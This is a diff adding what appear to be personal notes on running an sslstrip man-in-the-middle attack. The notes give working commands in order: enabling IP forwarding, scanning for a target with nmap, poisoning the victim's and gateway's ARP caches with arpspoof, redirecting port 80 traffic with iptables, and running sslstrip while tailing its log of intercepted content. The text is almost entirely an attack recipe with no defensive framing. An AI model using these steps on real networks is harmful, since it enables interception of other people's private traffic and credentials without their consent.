@@ -1,0 +1,24 @@
+sslstrip makes it possible to intercept https traffic and view content
+
+Launching an sslstip attack 1) Launch an ARP spoof. i) IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip\_forward ii) Identify the gateway and
+subnet mask using netstat -nr iii) Use nmap to identify a target on the
+network nmap -Rsn x.x.x.x/x iv) Start ARP cache poisoning using arpspoof
+-i eth0 -t x.x.x.x -r [default\_gateway] . This will show traffic leave
+the window open
+
+2) Once the ARP cache poisoning is set up, open a new terminal to set up
+   port redirects using iptables. This enables traffic to be redirected
+   to sslstrip listner port.
+
+#+BEGIN_QUOTE
+  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT
+  --to-port 8080
+#+END_QUOTE
+
+3) Launch sslstrip attack.
+
+#+BEGIN_QUOTE
+  sslstrip -l 8080 To view the results of this attack open another
+  terminal tail -n 50 -f sslstip.log
+#+END_QUOTE
